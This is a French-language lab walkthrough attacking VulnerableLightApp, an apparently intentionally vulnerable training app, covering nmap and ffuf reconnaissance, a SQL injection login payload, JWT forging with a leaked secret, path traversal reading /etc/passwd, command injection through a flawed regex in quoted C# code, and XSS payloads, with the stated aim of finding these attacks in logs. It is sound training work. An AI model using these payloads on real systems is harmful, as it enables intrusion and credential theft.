# I. Phase de reconnaissance

## Scanner pour découvrir (nmap)
Télécharger les Liste d'énumération
git clone https://github.com/danielmiessler/SecLists.git 

### Scan détection des services et versions
```sh
sudo nmap -sS -sV -p- -T4 10.0.0.3 
```
![alt text](<nmap service.png>)

### Scan agressif (OS, version, scripts) — plus bruyant
```sh
sudo nmap -sS -A -p- -T4 10.0.0.3
```

![alt text](<nmap more detailed services.png>)


## Énumération

### Énumérer les endpoints de l'appli VLA avec burp
```sh
sudo apt update
sudo apt install seclists
```
* listes installées dans /usr/share/seclists



### Énumérer avec FFUZ

ffuf est spécialisé dans les injections SQL, il permet aussi d'énumérer les Endpoints d'une appli
```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.0.0.3:3000/FUZZ -mc 200
```


---


# II. Gain Access

## SQL Injection

### Vérifier si l'appli est vulnérable à l'injection dans le champs utilisateur

* En mettant un `'` dans le nom d'user (Exemple: tot'o) on obtient ici une erreur 500.
* L'Erreur 500 reflète une erreur interne du serveur
* Essayer des injections dans le champ utilisateur
* Essayer d'avoir une réponse 200 de l'application et de pouvoir s'authentifier.
* Le champ password n'est pas injectable car il utilise les hash

Le champ de Login représente le payload:

{
  "user": "' OR '1'='1" ,
  "passwd": "string"
}





### Construction d'un Token JWS:

__HEADER.PAYLOAD.SIGNATURE__

* Header → type + algo
* Payload → données (infos utilisateurs)
* Signature → intégrité/authenticité


__Header__
```
{"alg":"HS256","typ":"JWT"}
```
indique que le token est un JWT et qu’il utilise l’algorithme de signature HMAC-SHA256.



__Payload__
```
{
  "user": "' OR '1'='1",
  "passwd": "string"
}
```
Ces infos sont lisibles (base64url) mais non chiffrées



__Signature__
```
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```
la partie de vérification est calculée en combinant le header et le payload avec une clé secrète

![alt text](<jwtexplained.png>)


## Utiliser le token pour s'authentifier

### Modifier la requête dans le repeater avec Burp
```html
GET / HTTP/2
Host: 10.0.0.3:3000
Authorization: Bearer <Token>
Accept: application/json
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
```
![alt text](<TokenInRequest.png>)


```sh
curl -k -i -H "Authorization: Bearer <Token>" "https://10.0.0.3:3000/"
``` 

![alt text](<curl.png>)



* S'authentifier dans le naviguateur de Burp

![alt text](<navigateur_auth.png>)

Actualiser le navigateur Burp :
![alt text](<nav_auth.png>)


__Trouver comment trouver le fichier "appsettings.json"__




## Local File Inclusion et Path Traversal


* Utiliser le paramètre lang pour afficher des fichier de l'application VLA

```
https://10.0.0.3:3000/?lang=appsettings.json
```


Ici on peut voir que ce fichier contient le secret du token VLA :
![alt text](<tokensecret.png>)



* La vulénaribilté LFI permet d'effectuer du `Path Traversal`
* Il est possible de naviguer vers les fichiers de la machine

Ici le contenu du fichier `/etc/passwd`
![alt text](<Path_Traversal.png>)

* Depuis un shell
```sh
curl -k -i -H "Authorization: Bearer <Token>" https://10.0.0.3:3000/?lang=/etc/passwd
```
![alt text](<Shell_path_Tra.png>)





## Remote Command Execution

* Utilisation du Endpoint LocalDNSResolver DE VLA

![alt text](<dnsresolver.png>)

Le Endpoint LocalDNSResolver de VLA dans son code source utilise une regex pour accepter le paramètre d'entrée utilisateur
```sh
^(?:[a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}(?:.{0,100})$
```
* Le code source initial ouvre un terminal pour exécuter nslookup
* Le paramètre `UserStr` attend une entrée utilisateur ce qui n'et pas conseillé au niveau backend
```C
Effectue une requête DNS pour le FQDN passé en paramètre
            */
            if (Regex.Match(UserStr, @"^(?:[a-zA-Z0-9_\-]+\.)+[a-zA-Z]{2,}(?:.{0,100})$").Success)
            {
                Process Cmd = new Process();
                Cmd.StartInfo.FileName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "powershell" : "/bin/sh";
                Cmd.StartInfo.RedirectStandardInput = true;
                Cmd.StartInfo.RedirectStandardOutput = true;
                Cmd.StartInfo.CreateNoWindow = true;
                Cmd.StartInfo.UseShellExecute = false;
                Cmd.Start();
                Cmd.WaitForExit(200);
                Cmd.StandardInput.WriteLine("nslookup " + UserStr);
                Cmd.StandardInput.Flush();
                Cmd.StandardInput.Close();
```

* L'entrée normale attendue serait un nom de domaine  ex: `taisen.fr`
* Étant mal programmée, la regex est plus permissive que prévu et permet d'insérer d'autre caractères
* Le endpoint LocalDNSResolver peut être utiilisé pour effectuer des commandes à distance dans terminal du serveur
* Ici un simple `;` permit par la regex nous permet d'exécuter la commande `id`

![alt text](<RCE.png>)






## XSS

* Cross Site Scripting

<svg/onload=alert(0)>
<marquee onstart=alert(1)>Ma 1ere XSS</marquee>
<script>alert(0)</script>




### Consulter les logs de VLA
```
VulnerableLightApp/in/debug/donet8.0/logs/...json
```
Le but pour la suite est de pouvoir retouver les attaques dans les logs :  SQLI, Swagger, LFI, Command Injection, XSS...